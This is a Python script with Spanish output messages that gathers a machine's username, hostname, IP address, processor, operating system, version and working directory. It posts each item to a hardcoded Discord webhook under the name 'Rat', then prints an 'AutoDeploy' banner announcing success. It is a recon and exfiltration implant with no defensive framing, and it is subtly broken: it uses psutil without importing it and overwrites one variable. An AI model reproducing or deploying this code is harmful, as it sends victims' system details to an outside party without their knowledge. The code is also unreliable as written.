import os, requests, socket, platform, datetime

webhook = 'https://discord.com/api/webhooks/1231671522775535799/G7h-1ni-seJgAbzVo1ItNrrk5iaJFvHPycqPkp3XyP5WV55hgQlaGVy_tHSfOpIOcgQz'

username = os.getlogin()
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
processor_model = platform.machine()
processor_info = platform.processor()
architecture = platform.architecture()[0]
system = platform.system()
date = datetime.datetime.now()
path = os.getcwd()
version = platform.version()
release = platform.release()
platform = platform.platform()
ram = psutil.virtual_memory()

message_date = f'`[+] Reporte realizado a las` **{date}**'
message_username = f'`[+] Nombre de usuario:` **{username}**'
message_hostname = f'`[+] Nombre del host:` **{hostname}**'
message_ip = f'`[+] Dirección IP:` **{ip}**'
message_processor_model = f'`[+] Modelo del procesador:` **{processor_model}**'
message_processor_info = f'`[+] Información del procesador:` **{processor_info}**'
message_architecture = f'`[+] Arquitectura:` **{architecture}**'
message_system = f'`[+] Sistema operativo:` **{system}**'
message_path = f'`[+] Ubicación actual:` **{path}**'
message_version = f'`[+] Versión:` **{version}**'
message_release = f'`[+] Release:` **{release}**'
message_release = f'`[+] Plataforma:` **{platform}**'

var_list = [message_date, message_username, message_hostname, message_ip, message_processor_model, message_processor_info, message_system, message_path, message_version, message_release]

def send_info():
    for var in var_list:
        requests.post(webhook, json={'username': 'Rat', 'content': var})

try:
    send_info()
    title = '''
╔═╗┬ ┬┌┬┐┌─┐┌┬┐╔═╗┌─┐┬  ┌─┐┬ ┬
╠═╣│ │ │ │ │ ││║╣ ├─┘│  │ │└┬┘
╩ ╩└─┘ ┴ └─┘─┴┘╚═╝┴  ┴─┘└─┘ ┴ 
'''
    print('\n' + title + '[+] Información enviada con éxito\n')

except KeyboardInterrupt:
    print('\n[+] Ha habido una interrupción por parte del teclado\n')

except:
    print('\n[+] Error: No se ha podido completar la operación\n')
